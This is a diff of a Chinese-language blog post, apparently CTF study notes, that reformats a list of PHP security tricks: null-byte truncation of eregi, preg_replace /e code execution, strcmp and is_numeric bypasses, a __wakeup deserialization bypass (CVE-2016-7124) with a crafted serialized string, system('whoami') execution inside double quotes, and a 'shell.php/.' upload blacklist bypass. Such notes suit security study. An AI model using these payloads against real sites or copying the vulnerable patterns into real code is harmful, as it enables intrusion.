@@ -15,7 +15,7 @@ tags:
 > 虽然现在的题目很少会用到了，但知道多点总是没坏处的。
 
 
-# 弱类型
+## 弱类型
 
 ```php
 <?php
@@ -36,7 +36,7 @@ var_dump($a == $b);
 
 ```
 
-# 科学记数法
+## 科学记数法
 
 ```php
 <?php
@@ -75,33 +75,33 @@ var_dump($a == $b);
     ```
 - ereg()/eregi()截断
 
-```php
-<?php
+    ```php
+    <?php
 
-//http://xxxx?a=abc;
+    //http://xxxx?a=abc;
 
-//输出 boolean false
+    //输出 boolean false
 
-//http://xxxx?a=abc%00;
+    //http://xxxx?a=abc%00;
 
-//输出 boolean true
+    //输出 boolean true
 
-var_dump(eregi('^[a-z]+$',$_GET[a]));
+    var_dump(eregi('^[a-z]+$',$_GET[a]));
 
-?>
-```
+    ?>
+    ```
 
 - preg_replace()代码执行<br>
 
-```php
-<?php
+    ```php
+    <?php
 
-//pattern里使用参数e导致代码执行
+    //pattern里使用参数e导致代码执行
 
-preg_replace('/test/e','phpinfo()','test');
+    preg_replace('/test/e','phpinfo()','test');
 
-?>
-```
+    ?>
+    ```
 
 - 对parse_url()参数检测的绕过<br>
 
@@ -114,112 +114,113 @@ preg_replace('/test/e','phpinfo()','test');
 `注：在path前面的"/"到达一定数量之后，parse_url会忽略参数`
 
 - mt_srand()伪随机数
-用`php_mt_seed`即可算出种子<br>
+    用`php_mt_seed`即可算出种子<br>
 
 
 - is_numeric()十六进制绕过
 
-```php
-<?php
+    ```php
+    <?php
 
-var_dump(is_numeric('0xabcd'));
-//输出 boolean true
+    var_dump(is_numeric('0xabcd'));
+    //输出 boolean true
 
-?>
-```
+    ?>
+    ```
 
-- strcmp()绕过<br>
+- strcmp()绕过
 
-strcmp输入数组作为参数会返回`NULL`<br>
-```php
-<?php
+    strcmp输入数组作为参数会返回`NULL`
+    ```php
+    <?php
 
-//http://xxxx?a[]=www
+    //http://xxxx?a[]=www
 
-$a=$_GET['a'];
-echo strcmp('aaaa',$a).'<br>';
+    $a=$_GET['a'];
+    echo strcmp('aaaa',$a).'<br>';
 
-//输出 无（即NULL）
+    //输出 无（即NULL）
 
-if(strcmp('aaaa',$a)){
-    echo 'false!';
-}else{
-    echo 'success!';
-}
-//输出 success
+    if(strcmp('aaaa',$a)){
+        echo 'false!';
+    }else{
+        echo 'success!';
+    }
+    //输出 success
 
-?>
-```
+    ?>
+    ```
 
 ## 反序列化
-- _wakeup()魔术方法的绕过<br>
-利用的是`CVE-2016-7124`<br>
+- _wakeup()魔术方法的绕过
 
-```php
-<?php
+    利用的是`CVE-2016-7124`
 
-class test{
+    ```php
+    <?php
 
-    public $s = 'secret';
+    class test{
 
-    function __construct(){
-        
+        public $s = 'secret';
+
+        function __construct(){
+            
+        }
+
+        function __wakeup(){
+            echo 'wakeup'.'<br>';
+            $this->s = '';
+        }
+
+        function __destruct(){
+            echo 'destruct '.$this->s.'<br>';
+            
+        }
     }
 
-    function __wakeup(){
-        echo 'wakeup'.'<br>';
-        $this->s = '';
-    }
+    $a = new test();
+    $serial = serialize($a).'<br>'; 
 
-    function __destruct(){
-        echo 'destruct '.$this->s.'<br>';
-        
-    }
-}
-
-$a = new test();
-$serial = serialize($a).'<br>'; 
-
-//O:4:"test":1:{s:1:"s";s:6:"secret";}
+    //O:4:"test":1:{s:1:"s";s:6:"secret";}
 
 
-unserialize($serial);
-//输出：
+    unserialize($serial);
+    //输出：
 
-//wakeup
+    //wakeup
 
-//destruct 
+    //destruct 
 
-//可以看到反序列化先运行了__wakeup()函数
+    //可以看到反序列化先运行了__wakeup()函数
 
-//但是如果把反序列化中参数的个数调整到比原本类的个数高的话，即可绕过wakeup
+    //但是如果把反序列化中参数的个数调整到比原本类的个数高的话，即可绕过wakeup
 
-//即 O:4:"test":2:{s:1:"s";s:6:"secret";}
+    //即 O:4:"test":2:{s:1:"s";s:6:"secret";}
 
-unserialize('O:4:"test":2:{s:1:"s";s:6:"secret";}');
-//输出： 
+    unserialize('O:4:"test":2:{s:1:"s";s:6:"secret";}');
+    //输出： 
 
-//destruct secret
+    //destruct secret
 
-//没有运行wakeup
+    //没有运行wakeup
 
 
-?>
+    ?>
 
-```
+    ```
 
 - 双引号里的代码执行
 
-```php
-<?php
+    ```php
+    <?php
 
-$a = "${system('whoami')}";
+    $a = "${system('whoami')}";
 
-?>
-```
+    ?>
+    ```
 
 ## 文件上传
 
 - shell.php/.
 
-上传的文件名带/.的话，php解析器自动忽略掉，从而绕过黑名单<br>
+    上传的文件名带/.的话，php解析器自动忽略掉，从而绕过黑名单<br>
